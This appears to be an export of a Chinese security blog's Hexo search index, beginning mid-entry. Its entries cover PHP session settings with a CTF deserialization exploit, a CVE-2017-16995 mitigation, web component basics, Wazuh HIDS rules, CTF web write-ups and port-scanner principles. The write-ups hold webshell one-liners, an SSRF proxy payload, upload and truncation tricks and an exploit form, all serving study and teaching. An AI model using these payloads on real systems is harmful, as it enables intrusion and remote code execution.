session.cookie_httponly cookie httponly session.cookie_path cookie存储的相对路径 / 和session.save_path合用 session.cookie_secure 是否只有https的时候才加上cookie session.entropy_file 设定session值的文件 session.entropy_length session值长度 session.gc_divisor 设置进程比率 1000 session.gc_maxlifetime （垃圾收集）被处理前的生存期 1440秒 session.gc_probability 垃圾收集的处理几率 1 默认千分之一的比率回收，概率=session.gc_probability/session.gc_divisor session.hash_bits_per_character 定义当转换2进制hash数据为一些可读的数据时,每个字符存储多少个比特 5 5 比特: 0-9, a-v session.hash_function 选择一个HASH函数,0为MD5(128比特强度),1为SHA-1(160比特强度) 0 默认MD5 session.name session名称 PHPSESSID 默认PHPSESSID session.referer_check 包含有用来检查每个 HTTP Referer 的子串 no value 如果客户端发送了 Referer 信息但是在其中并未找到该子串，则嵌入的会话ID 会被标记为无效。默认为空字符串 session.save_handler 保存session的类型 files 用文件存储session session.save_path session存储绝对路径 C:\phpStudy\PHPTutorial\tmp\tmp session.serialize_handler 使用的seesion序列化引擎 php session.upload_progress.cleanup 是否在上传完成后及时删除进度数据 On 上传完毕后删除 session.upload_progress.enabled 选项开启时,PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助,但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 On session.upload_progress.freq 选项控制了上传进度信息应该多久被重新计算一次 session.upload_progress.min_freq 类似同上 session.upload_progress.name PHP_SESSION_UPLOAD_PROGRESS session.upload_progress.prefix upload_progress_ session.use_cookies On session.use_only_cookies On session.use_trans_sid 0 相关安全隐患#session.serialize_handler当反序列化的数据与反序列化处理器不同时，通过特殊构造，可以伪造数据：由于php handler和php_serialize handler的结构不同，若将 123456$_SESSION['nyrae']='|O:4:"item":0:&#123;&#125;';在php_serialize处理器下结果为:a:1:&#123;s:5:"nyrae";s:16:"|O:4:"item":0:&#123;&#125;";&#125;若用php处理器反序列化，则会将|之前的内容都认为是其键值，值为item对象 注意，php 5.4之后 默认session.serialize_handler 为php_serialize #upload_progress 当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 根据说明，我们可以得出: 当upload_progress.enabled开启时，当POST一个session.upload_progress.name同名变量时，会向$_SESSION的session.upload_progress.prefix. session.upload_progress.name连接在一起的字段中写入内容 可以从一道题中，看出其利用方式，题目在这里http://web.jarvisoj.com:32784/ 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 根据代码结构可以想到是一个反序列化的题目，应该是想办法创建OowoO对象，等到对象销毁时执行eval命令得到flag。由于没有unserialize函数，没有明显的写入点。这时，upload_progress就有了作用。 整体思想就是：利用upload_progress上传一个名字为PHP_SESSION_UPLOAD_PROGRESS的字段，然后利用session.serialize_handler的不一致，由于其会向$_SESSION中upload_progress_PHP_SESSION_UPLOAD_PROGRESS字段写入内容，其必然会调用php 反序列化处理器，我们向其中构造一个OowoO对象，mdzz字段为要执行的代码，当程序运行完，执行析构函数时，便会执行我们构造的恶意代码。 所以可以构造表单: 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123"&gt; &lt;input type="file" name="file"&gt; &lt;input type="submit" value="提交"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 然后修改其值:]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>web security</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu 提权 CVE-2017-16995]]></title>
    <url>%2Fblog%2Fubuntu-privilege-escalation%2F</url>
    <content type="text"><![CDATA[最近爆出 Ubuntu 本地提权漏洞且影响最新的16.04 CVE-2017-16995 影响范围比较大。 影响版本Linux Kernel Version 4.14-4.4 （主要影响Debian和Ubuntu发行版，Redhat和CentOS不受影响） 实际利用ichunqiu上已经放出靶场，可以直接练习，其只需要运行exploit程序即可提权。 漏洞分析CVE-2017-16995: Ubuntu本地提权分析报告 深入分析Ubuntu本地提权漏洞—【CVE-2017-16995】 这两篇文章说的比较透彻，感谢大佬。 修复建议在root权限下： 1echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled 修改内核参数，限制普通用户使用bpf(2)系统调用]]></content>
      <categories>
        <category>BIN</category>
      </categories>
      <tags>
        <tag>bin</tag>
        <tag>ubuntu</tag>
        <tag>privilege escalation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web服务器、容器、中间件、反向代理、框架及相关组件介绍]]></title>
    <url>%2Fblog%2Fweb-component%2F</url>
    <content type="text"><![CDATA[在做web安全的过程中，经常遇到各种语言的web服务器、框架、容器、组件等等，很多时候这些东西我们都没有实际使用过(我之前基本都是[apache/nginx] + [django/flask] + python)，对于java web及相关的组件不是很了解，但java系列公司都在用且高危漏洞都很多，借此机会刚好理清楚。 本文涉及web相关组件的类别为: web服务器 应用服务器 CGI web容器 反向代理服务器 中间件 web框架 web服务器 &amp; CGI &amp; 应用服务器在最初的HTTP1.0阶段，超链接出现，网页内容还属于初期，web服务器的概念被逐渐提出，当时的web服务器主要是通过HTTP协议传输静态页面内容和图片，当时的HTTP 1.0其实只是一种文件传输的方式。渐渐的，由于不满足于静态内容，无法针对不同的请求提供不同的服务，HTTP逐渐提供的CGI功能。 CGI—— COMMON GATEWAY INTERFACE 是用来针对不同的请求提供不同的内容，即动态内容。CGI是一种处理动态内容的标准，你可以使用任意的语言去实现。CGI协议允许我们添加任意的程序和服务。它是我们标准编程语言与web服务器之间的接口(当然，一般我们CGI与后端编程语言是一致的)。当用户通过浏览器访问内容时，其会传输CGI script name和数据到服务器上，然后服务器会调用CGI脚本去解析生成动态内容，最后由web服务器返回给用户。 应用服务器最初是一些专用产品使用专用的通信协议进行互联，由于HTTP协议的引用及web服务器更高的负载、更多的并发和拥有更好的特性，应用服务器逐渐和web服务器趋于一致。 但如果有区分时，web服务器往往指的是以HTTP为核心、web UI为向导的应用。而应用服务器，指高负载、企业级特性、事务和队列、多通道通信（HTTP和更多的协议的产品，但往往应用服务器这些特性web服务器也可能完成。 web服务器通常响应静态页面或图片的请求，进行页面跳转，然后把动态请求委托给其他程序(它的扩展、某种语言的解释引擎、Web容器) 常见的web服务器: IIS、Apache、Nginx、Lighttpd常见的应用服务器: Tomcat，WebLogic，WebSphere，Jboss 容器 &amp; web容器容器作为操作系统和应用程序之间的桥梁，给处于其中的应用程序组件提供一个环境，使应用程序直接跟容器中的环境变量交互，不必关注其它系统问题。 而web容器顾名思义是处理http的容器。 简单的说，web容器是对web服务器的增强与封装(容器与应用服务器同理)，他将原始的request解码 ---&gt; 静态/动态处理模块结构进行了封装，变成了request解码 ---&gt; request封装 ---&gt; 生成response上下文 ---&gt; URL路由 ---&gt; 静态/动态处理(管理)方式，对于请求的抽象与动态处理的管理更加高级与去耦合，还根据每个请求分配一个线程等等，使得我们更好的去关注逻辑本身而非流程处理。 举个栗子，servlet可以理解服务器端处理数据的java小程序，针对不同的请求，我们有不同的servlet去实现相应的逻辑，而web容器就是管理所有servlet的东西，它帮我们定位、调用、结束需要的servlet。 有些服务器中集成了容器： Tomcat(拥有JSP容器，servlet容器) 、 Jboss(拥有EJB容器)、 IIS(拥有ASP容器) IIS，Tomcat，WebLogic，WebSphere即是应用服务器，又拥有web服务器的功能。tomcat可以单独运行也可以被集成到Apache中，Apache处理静态文件比Tomcat快。 中间件 中间件是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源，中间件位于客户机服务器的操作系统之上，管理计算资源和网络通信，也可以定义为网络环境下处于操作系统、数据库等系统软件和应用软件之间的一种起连接作用的分布式软件，主要解决异构网络环境下分布式应用软件的互连与互操作问题，提供标准接口、协议，屏蔽实现细节，提高应用系统易移植性。 在Java web开发的演进与进化中，我们对于消息系统，数据库，服务化接口的抽象等，涉及数据分离的过程中，在分离过程中，就会涉及到分离后系统间，数据库间的交互。java中间件就是处理我们数据间交互，连接数据分离后两个系统间的通信，中间件不属于任何一个开发项目，就是让我们对应系统间或者数据库间数据流通无感知。有点像Linux下的管道。 1234567891011121314上面说到java是数据间的中间件，在java web开发中适用的范围主要应该是下面三个领域：远程过程调用和对象访问中间件主要解决分布式环境下应用的互相访问问题，这也是支撑应用服务化功能的基础；例如：RPC：Remote Process Call（远程过程调用中间件）消息中间件：解决应用之间的消息传递、解耦、异步的问题。例如：ActiveMQ 是Apache出品，最流行的，能力强劲的开源消息总线。ActiveMQ 是一个完全支持JMS1.1和J2EE 1.4规范的 JMS Provider实现。数据访问中间件主要解决应用访问数据库的共性问题的组件例如：数据访问中间间就是我们使用数据库指定的数据驱动，例如：ODBC JDBC，以 JDBC 为例，数据库本地维护了一个数据访问中间件，我们在访问数据库的时候，配置的地址其实是直接连接到JDBC这个数据访问中间件，如果我们执行查询数据，或者对数据库的操作都是通过JDBC来连接数据库，然后通过JDBC查询完成数据库以后再返回给我们应用程序。作为中间件，查询过程对于我们是不可知的。 反向代理反向代理是代理服务器的一种。它根据客户端的请求，从后端的服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端。与前向代理不同，前向代理作为一个媒介将互联网上获取的资源返回给相关联的客户端，而反向代理是在服务器端（如Web服务器）作为代理使用，而不是客户端。 1资源服务器(文件/web/邮件) &lt;-------&gt; 反向代理服务器 &lt;-------&gt; Internet &lt;--------&gt; 用户 框架框架只是一种推荐规范的代码结构，为了方便大型项目管理与构建，当然现在的框架往往不止这些，往往都包括容器等内容，常见的框架有: Django Flask Spring Struts2 Spring Hibernate ThinkPHP]]></content>
      <categories>
        <category>web development</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>web component</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HIDS-Wazuh 功能分析]]></title>
    <url>%2Fblog%2Fhids-wazuh%2F</url>
    <content type="text"><![CDATA[Wazuh，一款以ossec作为引擎的主机入侵检测系统。通过与ELK的结合，便于管理员通过日志平台查看系统日志信息、告警信息、规则配置信息等。其采用C/S的模式，客户端通过agent收集数据发送给wazuh server，然后进行分析处理结果。 与ossec类似，我们通过介绍他的主要功能更好的了解系统的原理。主要分了以下几个部分： 日志分析 文件完整性检验 异常和恶意软件检测 监控安全策略 监控系统调用 命令监控 主动响应 无代理监控 防洪机制 漏洞检测 日志分析获取系统日志或者设备远程系统日志进行实时分析，通过日志识别应用程序或系统错误、配置错误、入侵企图、违规操作等安全问题。 数据收集日志配置如下，可以看到支持linux、windows、windows时间、windows关到: 12345678910111213141516171819202122232425[linux]&lt;localfile&gt;&lt;location&gt;/var/log/example.log&lt;/location&gt;&lt;log_format&gt;syslog&lt;/log_format&gt;&lt;/localfile&gt;[windows event]&lt;localfile&gt;&lt;location&gt;Security&lt;/location&gt;&lt;log_format&gt;eventlog&lt;/log_format&gt;&lt;/localfile&gt;[windows eventchannel]&lt;localfile&gt;&lt;location&gt;Microsoft-Windows-PrintService/Operational&lt;/location&gt;&lt;log_format&gt;eventchannel&lt;/log_format&gt;&lt;/localfile&gt;[windows rsyslog]&lt;ossec_config&gt;&lt;remote&gt;&lt;connection&gt;syslog&lt;/connection&gt;&lt;allowed-ips&gt;192.168.2.0/24&lt;/allowed-ips&gt;&lt;/remote&gt;&lt;ossec_config&gt; 数据分析主要分两步，解码和规则匹配。以日志记录为例： 1Feb 14 12:19:04 localhost sshd[25474]: Accepted password for rromero from 192.168.1.133 port49765 ssh2 这是一条最常见的ssh登陆成功日志，HIDS主要做两步，1是预解码，取出静态字段 12localhostsshd 2是根据日志消息，提取信息: 123应用名称: sshd目的用户: rromero源IP: 192.168.1.133 然后根据规则匹配: 12345&lt;rule id="5715" level="3"&gt;&lt;if_sid&gt;5700&lt;/if_sid&gt;&lt;match&gt;^Accepted|authenticated.$&lt;/match&gt;&lt;description&gt;sshd: authentication success.&lt;/description&gt;&lt;group&gt;authentication_success,pci_dss_10.2.5,&lt;/group&gt;&lt;/rule&gt; 一旦匹配成功，将创建一个报警 123456** Alert 1487103546.21448: - syslog,sshd,authentication_success,pci_dss_10.2.5,2017 Feb 14 12:19:06 localhost-&gt;/var/log/secureRule: 5715 (level 3) -&gt; 'sshd: authentication success.'Src IP: 192.168.1.133User: rromeroFeb 14 12:19:04 localhost sshd[25474]: Accepted password for rromero from 192.168.1.133 port49765 ssh2 文件完整性检测 Wazuh 的文件完整性监控（FIM）监控指定的文件，如果这些文件被修改则触发报警。这个组件存储了常见的正常文件或 windows 注册表项的加密校验和其他属性，并定期将其与系统正在使用的当前文件进行比较，来确定文件是否被修改. wazuh agent 定时(默认6小时)去扫描监控的文件并将hash值和文件属性发送给wazuh manager,如果需要实时监控，则需配置单个文件。 当检测到hash不一致时，生成报警，类似以下： 123456789** Alert 1460948255.25442: mail - ossec,syscheck,pci_dss_11.5,2016 Apr 17 19:57:35 (ubuntu) 10.0.0.144-&gt;syscheckRule: 550 (level 7) -&gt; 'Integrity checksum changed.'Integrity checksum changed for: '/test/hello'Size changed from '12' to '17'Old md5sum was: 'e59ff97941044f85df5297e1c302d260'New md5sum is : '7947eba5d9cc58d440fb06912e302949'Old sha1sum was: '648a6a6ffffdaa0badb23b8baf90b6168dd16b3a'New sha1sum is : '379b74ac9b2d2b09ff6ad7fa876c79f914a755e1' 还可以配置忽略或者单独添加文件的监控 异常和恶意软件检测 异常检测是通过在系统中查找不正常的操作行为模式，一旦恶意软件（例如：rootkit）安装在操作系统上，它会通过修改系统来使自身隐藏起来。虽然恶意软件会使用各种技术来实现这个目的，但是 Wazuh 使用广泛普遍的方式来查找并指示入侵者的异常行为模式。负责这个任务的主要组件是 rootcheck. 其可以完成的内容如下: #文件完整性监控同上 #检查运行的进程恶意进程可以隐藏自己使用户无法通过系统进程列表查看到自己（PS 命令的特洛伊版本），Rootcheck检查所有进程 ID（PID），以查找与不同系统调用的差异（getsid、getpgid） 1234** Alert 1460225922.841535: mail - ossec,rootcheck2017 Feb 15 10:00:42 (localhost) 192.168.1.240-&gt;rootcheckRule: 510 (level 7) -&gt; 'Host-based anomaly detection event (rootcheck).'Process '495' hidden from /proc. Possible kernel level rootkit. #检查隐藏的端口恶意软件可以使用隐藏端口与攻击者进行通信，Rootcheck 使用 bind() 检查系统中的每个端口，如果它无法绑定到端口并且该端口不在 netstat 输出中，则可能存在而已软件。 #检查异常文件和权限Wazuh 扫描整个文件系统寻找不寻常的文件和权限，所有拥有者是 root 的文件都会被检查对于其他用户是否有写权限，如：sudi 文件、隐藏目录和文件。 #使用系统函数检查隐藏文件Wazuh 扫描整个文件系统，使用 fopen+read 函数统计文件大小并进行比较，对于目录节点使用 opendir+readdir 的输出结果进行比较，如果结果不匹配则可能存在恶意软件，报警日志如下: 1234** Alert 1460225922.51190: mail - ossec,rootcheck2017 Feb 15 10:30:42 (localhost) 192.168.1.240-&gt;rootcheckRule: 510 (level 7) -&gt; 'Host-based anomaly detection event (rootcheck).'Files hidden inside directory '/etc'. Link count does not match number of files (128,129) #扫描 /dev/dev目录只包含特定于设备的文件，任何其他的文件都应该被检查，因为恶意软件可能使用这个分区来隐藏文件。例如：在/dev下创建一个隐藏文件 #扫描网络接口#rootkit检查监控安全策略策略监控是验证所有系统正在使用的配置信息是否符合一组预定义规则的过程，Wazuh 使用的三个组件：Rootcheck、OpenSCAP 和 CIS-CAT #RootcheckWazuh 监视配置文件以确保他们符合你的安全策略、标砖和强化指南，通过 agent 定期扫描检测已知易受攻击、未打补丁和错误配置的应用程序 Rootcheck可用于: 检测进程是否运行 检查文件是否存在 检查文件内容是否包含某个表达式或者 windows 注册表的键值里是否包含某个字符串或表达式 其根据配置周期扫描 #OpenSCAP是用于表达和标准化的方式操纵证券数据的规范。SCAP 联合使用多种规范来实现自动化持续监控，漏洞管理和安全合规性扫描。 验证安全合规性：OpenSCAP 中定义了组织中所有系统必须符合的要求，以符合使用的安全策略和安全基准 执行漏洞评估：OpenSCAP 可识别和分类系统中的漏洞 执行专门的评估：OpenSCAP 可以执行特定的自定义系统检查（即检查可疑文件名和可以文件位置） #CIS-CAT 集成CIS（互联网安全中心）是一个致力于保护私人和公共组织免受网络威胁。CIS 基准指南是公认的全球标准和保护 IT系统和数据免受网络攻击的最佳实践 IP-CAT 是利用跨平台的 java 应用程序，用于扫描目标系统将系统设置与 CIS 基准进行比较然后生成一份报告。有超过 80 个 CIS 基准涵盖几乎所有操作系统，根据不同的需要进行不同的配置 系统调用在 Linux 的审计系统提供了一种方法来跟踪你机器上安全相关的信息，根据预先配置的规则，Audit 可以对您系统上发生的事件进行详细的实时记录。这些信息对于一些关键系统检测他们执行的操作是否违反安全策略至关重要。 例如 12345678910111213141516171819202122232425- 监控一个 ID 大于 500 的系统用户在删除或者重命名文件是创建日志条目 -# auditctl -a always,exit -S unlink -S unlinkat -S rename -S renameat -F auid&gt;=500 -Fauid!=4294967295 -k delete- 监控访问目录/home -auditctl -w /home -p w -k audit-wazuh-wauditctl -w /home -p a -k audit-wazuh-aauditctl -w /home -p r -k audit-wazuh-rauditctl -w /home -p x -k audit-wazuh-x* 当发生新增文件 touch /home/malware.py会产生报警:** Alert 1487891161.28457: - audit,audit_watch_write,audit_watch_create, 2017 Feb 23 15:06:01 localhost-&gt;/var/log/audit/audit.log Rule: 80790 (level 3) -&gt; 'Audit: Created: /home/malware.py' type=SYSCALL msg=audit(1487891161.190:2942): arch=c000003e syscall=2 success=yes exit=3a0=7ffce677b7b7- 监控用户行为 -# auditctl -a exit,always -F euid=0 -F arch=b64 -S execve -k audit-wazuh-c# auditctl -a exit,always -F euid=0 -F arch=b32 -S execve -k audit-wazuh-c* 使用 root 用户执行nano,警报如下：** Alert 1487892032.56406: - audit,audit_command,2017 Feb 23 15:20:32 localhost-&gt;/var/log/audit/audit.logRule: 80792 (level 3) -&gt; 'Audit: Command: /usr/bin/nano'type=SYSCALL msg=audit(1487892031.893:2963): arch=c000003e syscall=59 success=yes exit=0a0=14e4990a1=14e4a30 a2=14d4ef0 a3=7ffdd01083d0 items=2 ppid=60621 pid=60840 auid=1000 uid=0 gid=0 euid=0suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=346 comm="nano" exe="/usr/bin/nano"subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="audit-wazuh-c" type=EXECVEmsg=audit(1487892031.893:2963): argc=1 a0="nano" type=CWD msg=audit(1487892031.893:2963): 命令监控命令监控用于监控日志之外的东西，比如执行的命令。wazuh集成了监视特定命令输出结果。 例如： 12345678910111213141516171819202122232425262728293031323334- 监控进程运行 -&lt;localfile&gt; &lt;log_format&gt;full_command&lt;/log_format&gt; &lt;command&gt;tasklist&lt;/command&gt; &lt;frequency&gt;120&lt;/frequency&gt;&lt;/localfile&gt;- 磁盘利用率 -&lt;rule id="531" level="7" ignore="7200"&gt; &lt;if_sid&gt;530&lt;/if_sid&gt; &lt;match&gt;ossec: output: 'df -P': /dev/&lt;/match&gt; &lt;regex&gt;100%&lt;/regex&gt; &lt;description&gt;Partition usage reached 100% (disk space monitor).&lt;/description&gt; &lt;group&gt;low_diskspace,pci_dss_10.6.1,&lt;/group&gt;&lt;/rule&gt;当磁盘利用率达到100%时报警- 检查tcp端口是否有变化 -&lt;rule id="533" level="7"&gt; &lt;if_sid&gt;530&lt;/if_sid&gt; &lt;match&gt;ossec: output: 'netstat -tan&lt;/match&gt; &lt;check_diff /&gt; &lt;description&gt;Listened ports status (netstat) changed (new port opened or closed).&lt;/description&gt; &lt;group&gt;pci_dss_10.2.7,pci_dss_10.6.1,&lt;/group&gt;&lt;/rule&gt;- 检测USB存储 -&lt;rule id="140125" level="7"&gt; &lt;if_sid&gt;530&lt;/if_sid&gt; &lt;match&gt;ossec: output: 'reg QUERY&lt;/match&gt; &lt;check_diff /&gt; &lt;description&gt;New USB device connected&lt;/description&gt;&lt;/rule&gt; 主动响应主动响应配置定义了命令将要执行的时间和位置，如果条件满足特定的规则 ID、严重级别或者特定的来源规则则触发命令。 例如: 123456789101112131415- 增加一个 IP 到 iptables 的拒绝访问列表 -&lt;command&gt; &lt;name&gt;firewall-drop&lt;/command&gt; &lt;executable&gt;firewall-drop.sh&lt;/executable&gt; &lt;expect&gt;srcip&lt;/expect&gt;&lt;/command&gt;命令要执行的脚本是firewall-drop.sh，触发规则之后将srcip中的 IP 增加到 iptables 的封禁列表&lt;active-response&gt; &lt;command&gt;firewall-block&lt;/command&gt; &lt;location&gt;all&lt;/location&gt; &lt;rules_group&gt;authentication_failed,authentication_failures&lt;/rules_group&gt;&lt;timeout&gt;700&lt;/timeout&gt;&lt;repeated_offenders&gt;30,60,120&lt;/repeated_offenders&gt;&lt;/active-response&gt; 无代理监控无代理监控允许您通过SSH监控没有代理的设备或系统，例如路由器，防火墙，交换机和 linux/bsd 系统。可以满足一些用户设备不允许或者不能安装 agent 的情况. 例如: 123BSD完整性检查Linux完整性检查pix config [监控Cisco PIX/router 的配置文件] 防洪机制这个机制的作用是防止 agent 上的大型突发事件对网络或者 manager 造成负面的影响。它使用漏斗队列来收集所有生成的事件，并以低于指定事件每秒阈值的速率将它们发送给 manager，这有助于避免来自 Wazuh 组件的事件以外丢失。 当agent监控一个不断变化的目录，或者某些应用程序遇到错误，一直重试， 按照我们所配置的规则，会产生大量的事件，导致agent，网络或者manager运行受阻。 主要由2部分组成: Agent-to-Manager 防洪机制 agent 端提供了一个漏斗队列以及事件阻塞控制来防止 agent 使网络或 manager 饱和 内部 agent 防洪控制 该机制在 agent 的不同组件中使用内部限制，控制它们生成事件的速率 漏洞检测agent 会收集本地已安装的应用程序列表，并定期将其发送给 manager（每个 agent 都会在本地存储一个 sqlite 数据库）。此外 Manager 使用公共 OVAL CVE 存储库构建全球漏洞数据库，然后将其用于此信息与 agent 的应用程序清单数据进行交叉关联。]]></content>
      <categories>
        <category>security product analysis</category>
      </categories>
      <tags>
        <tag>hids</tag>
        <tag>security product</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-web题目集合]]></title>
    <url>%2Fblog%2Fctf-web-interesting-topics%2F</url>
    <content type="text"><![CDATA[这里记录了CTF题目中个人觉得比较有意思的web题目或者有意思的解法。 以下是涉及的题目来源： ISCC2016 61DCTF jarvisoj HITCON CTF 2016 一句话木马利用# 来源题目链接在这里 小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？关卡入口：http://web.jarvisoj.com:32782/ # 解析打开地址后发现，有一张图片&lt;img src=&quot;proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg&quot; alt=&quot;&quot;&gt;和一个管理员链接http://web.jarvisoj.com:32782/admin,管理员链接点开后发现没有权限，源码中有admin的IP地址。 我们通过分析题目可以得出，小明上传了一句话木马，而常见的一句话木马一般是以下这种形式: 12345evil.phpeval($_GET['url']);或者：echo file_get_contents($_GET[a]); 所以我们可以合理的猜测,proxy.php为其上传的木马，url为我们传递的恶意参数，可以理解为使用proxy.php去代理请求,那么我们很自然的可以构造出管理链接: 1http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin 但是权限是不够的，可以合理猜测admin是有权限访问/admin路径的，则最终payload为： 1http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/ 文件上传 &amp; 文件包含# 来源题目链接在这里 “没有什么防护是一个漏洞解决不了的，如果有，那就…..“ # 解析其最核心的有2点: 图片的一句话木马除了&lt;?php phpinfo(); ?&gt;还可以&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; 其根据index.php?page=view/submit 的page参数去使用fopen()打开相应的文件,可以使用fopen(uploads/xxx.jpg%00)截断后面的php 敏感信息泄露# 来源61DCTF中的web题中基本给个假index，然后去寻找真正的入口。 # 解析 可以去搜寻index.phps或者index.php~去获取源码，如果没有额外的页面，往往可以在这些页面中找到结果。 注意url、文件、资源的打开、传递方式，往往能够得到读取任意文件内容的方式(虽然实战中基本不会出现) 一些隐藏文件被误上传到了服务器上而且可以被访问，往往泄露重要信息: .git 可以得到版本分支和源码等信息 .DS_Store MAC下自动生成的用于Finder布局的信息，可以造成文件名泄露 .idea 用phphstorm等开发的配置文件等内容 php 反序列化# 来源 HITCON 2016 代码审计 jarvisoj web phpinfo # 解析php反序列化一般利用点： CVE-2016-7124，绕过__wakeup函数 serialize_handler不一致造成的对象注入，php和php_serialize区别 upload_progress的利用]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>CTF</tag>
        <tag>security</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扫描器原理总结]]></title>
    <url>%2Fblog%2Fscanning-principle%2F</url>
    <content type="text"><![CDATA[我们分以下几种类型来分析扫描器原理： 端口扫描 服务检测 操作系统检测 端口扫描一般我们使用以下协议进行端口扫描： TCP UDP ICMP TCP 端口扫描 TCP connect 扫描 TCP SYN 扫描 TCP Xmas Tree 扫描 TCP null 扫描 TCP ACK 扫描 # TCP connect 扫描与目标端口建立3次握手，如果成功建立则为open，收到RST则为close # TCP SYN 扫描也称为TCP半连接扫描，只发送三次握手的第一次SYN报文段，如果收到ACK+SYN则为open，收到RST则为close，这种好处是不必等待三次握手完全完成，速度快且不容易被防火墙记录进日志。 # TCP Xmas Tree 扫描客户端向服务端发送带有 PSH，FIN，URG 标识的数据包(即不含有ACK SYN RST)，被称为TCP Xmas Tree扫描。其利用的是RFC的规定: 1如果不设置SYN，RST，或者ACK位的报文发送到开放端口，理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 那么有以下规则： 12如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK, 任何其它三种(FIN，PSH，and URG)的组合都行。 # TCP null 扫描空扫描即flag位全0，如果没有回复则为open，收到RST则为close # TCP ACK 扫描这种扫描无法得知端口的开放状态，只能探知端口是否被过滤，因为无论端口开放与否都会返回RST报文段。 UDP 扫描UDP扫描比较简单，一般如果返回ICMP port unreachable说明端口是关闭的，而如果没有回应或有回应(有些UDP服务是有回应的但不常见)则认为是open，但由于UDP的不可靠性，无法判断报文段是丢了还是没有回应，所以一般扫描器会发送多次，然后根据结果再判断。这也是为什么UDP扫描这么慢的原因。 ICMP 扫描 类型字段：指明该数据包属于什么大分类 代码字段：指明数据包属于大类里面的哪个小类 校验和 ： 指明该数据包的校验和 除了正常的ICMP echo(发送回显Type＝8，返回Type=0，或不可达Type=3),高级ICMP扫描技术采用的是ICMP数据报错误处理。 根据网络协议，如果按照协议出现了错误，那么接收端将产生一个icmp的错误报文。这些错误报文并不是主动发送的，而是由于错误，根据协议自动产生。 所有Type类型如下： 123456789101112130 响应应答（ECHO-REPLY）3 不可到达4 源抑制5 重定向8 响应请求（ECHO-REQUEST）11 超时12 参数失灵13 时间戳请求14 时间戳应答15 信息请求（*已作废）16 信息应答（*已作废）17 地址掩码请求18 地址掩码应答 常见错误利用如下： 服务版本检测我们以nmap的版本检测为例,观察nmap-service-probes文件内容: 12345678910111213141516171819202122# This is the NULL probe that just compares any banners given to us##############################NEXT PROBE##############################Probe TCP NULL q||# Wait for at least 6 seconds for data. It used to be 5, but some# smtp services have lately been instituting an artificial pause (see# FEATURE('greet_pause') in Sendmail, for example)totalwaitms 6000# If the service closes the connection before 3 seconds, it's probably# tcpwrapped. Adjust up or down depending on your false-positive rate.tcpwrappedms 3000match 1c-server m|^S\xf5\xc6\x1a&#123;| p/1C:Enterprise business management server/match 4d-server m|^\0\0\0H\0\0\0\x02.[^\0]*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$|s p/4th Dimension database server/ cpe:/a:4d_sas:4d/match aastra-pbx m|^BUSY$| p|Aastra/Mitel 400-series PBX service port|match acap m|^\* ACAP \(IMPLEMENTATION \"CommuniGate Pro ACAP (\d[-.\w]+)\"\) | p/CommuniGate Pro ACAP server/ v/$1/ i/for mail client preference sharing/ cpe:/a:stalker:communigate_pro:$1/match acarsd m|^g\0\0\0\x1b\0\0\0\0\0\0\0acarsd\t([\w._-]+)\tAPI-([\w._-]+)\)\0\0\0\x06\x05\0\0\0\0\0\0&lt;\?xml | p/acarsd/ v/$1/ i/API $2/ cpe:/a:acarsd:acarsd:$1/match acmp m|^ACMP Server Version ([\w._-]+)\r\n| p/Aagon ACMP Inventory/ v/$1/match apachemq m|^\0\0..\x01ActiveMQ\0\0\0.\x01\0\0.*\x0cProviderName\t\0\x08ActiveMQ.*\x0fPlatformDetails\t..JVM: (\d[^,]*), [^,]*, Oracle Corporation, OS: Linux, (\d\.[\d.]+)[^,]*, 